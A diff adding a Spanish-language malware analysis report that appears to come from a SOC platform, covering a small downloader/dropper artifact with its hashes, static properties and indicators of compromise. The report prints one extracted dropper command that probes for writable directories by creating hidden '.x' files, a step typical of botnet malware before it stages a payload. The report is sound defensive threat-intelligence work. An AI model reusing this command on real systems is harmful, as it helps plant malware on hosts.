@@ -1,0 +1,60 @@
+# 🧬 Payload Analysis
+
+`994e6dabd5dff94f21683f958e988fddd5d36d421ee311de7b9669537298a41c`
+
+## 📌 Resumen
+
+Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota. Se asoció 1 comando observado o extraído.
+
+## 🏷️ Clasificación
+
+- **Categoría:** `Downloader / Dropper`
+- **Confianza:** `Baja`
+- **Riesgo:** `Medium`
+
+## 🗓️ Registro
+
+- **Registrado:** `2026-08-09T19:30:44+00:00`
+- **Tipo de registro:** `snapshot inmutable`
+
+## 🔐 Identidad
+
+- **SHA256:** `994e6dabd5dff94f21683f958e988fddd5d36d421ee311de7b9669537298a41c`
+- **MD5:** `ef34d080a5a26971b3f3ed9ade361d86`
+
+## 🧪 Análisis estático
+
+| Propiedad | Resultado |
+| --- | --- |
+| Descripción | data |
+| Tamaño | 273 B |
+| Entropía | 4.91 |
+| Strings | 5 |
+
+## 🧠 Comportamiento observado
+
+1. **Descarga remota**
+
+## 🔬 Evidencia de clasificación
+
+- Download indicators (wget/curl + /tmp)
+
+## 🖥️ Comandos observados / extraídos
+
+```text
+>/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd /
+```
+
+## 🌐 Indicadores
+
+| Tipo | Valor | Contexto |
+| --- | --- | --- |
+| hash | 994e6dabd5dff94f21683f958e988fddd5d36d421ee311de7b9669537298a41c | static_analysis |
+| command | >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/shm/.x&&cd /dev/shm;>/tmp/.x&&cd / | strings |
+| ip | 72.255.32.XXX | artifact_source |
+
+## 🛡️ Nota de publicación
+
+Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.
+
+Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
